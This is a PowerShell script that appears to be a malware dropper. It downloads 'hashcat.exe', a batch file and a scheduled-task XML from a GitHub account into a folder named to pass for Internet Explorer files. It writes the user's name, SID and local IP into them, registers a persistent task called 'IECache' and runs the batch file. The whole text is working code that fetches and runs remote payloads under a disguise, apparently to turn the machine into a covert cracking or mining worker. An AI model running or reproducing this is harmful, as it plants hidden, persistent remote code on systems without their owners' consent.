New-Item -ItemType Directory -Force -Path C:\Users\Admin\.IExplorer

$source = 'https://github.com/mysec000/hashcat/blob/main/hashcat.exe?raw=true'
$destination = 'C:\Users\Admin\.IExplorer\hashcat.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
$source = 'https://raw.githubusercontent.com/mysec000/hashcat/main/Readme.bat?raw=true'
$destination = 'C:\Users\Admin\.IExplorer\Readme.bat'
Invoke-WebRequest -Uri $source -OutFile $destination
$source = 'https://raw.githubusercontent.com/mysec000/tools/main/IECache.xml?raw=true'
$destination = 'C:\Users\Admin\.IExplorer\IECache.xml'
Invoke-WebRequest -Uri $source -OutFile $destination


(Get-Content C:\Users\Admin\.IExplorer\IECache.xml -Raw) -Replace 'uname', ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name  | Set-Content C:\Users\Admin\.IExplorer\IECache.xml
(Get-Content C:\Users\Admin\.IExplorer\IECache.xml -Raw) -Replace 'sid', ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value  | Set-Content C:\Users\Admin\.IExplorer\IECache.xml

$localIpAddress=((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
(Get-Content C:\Users\Admin\.IExplorer\Readme.bat -Raw) -Replace 'rig3', ($localIpAddress)  | Set-Content C:\Users\Admin\.IExplorer\Readme.bat


if ($(Get-ScheduledTask -TaskName "IECache" -ErrorAction SilentlyContinue).TaskName -eq "IECache") {
    Unregister-ScheduledTask -TaskName "IECache" -Confirm:$False
}
schtasks /Create /TN "IECache" /XML "C:\Users\Admin\.IExplorer\IECache.xml" 




Start-Process "C:\Users\Admin\.IExplorer\Readme.bat"
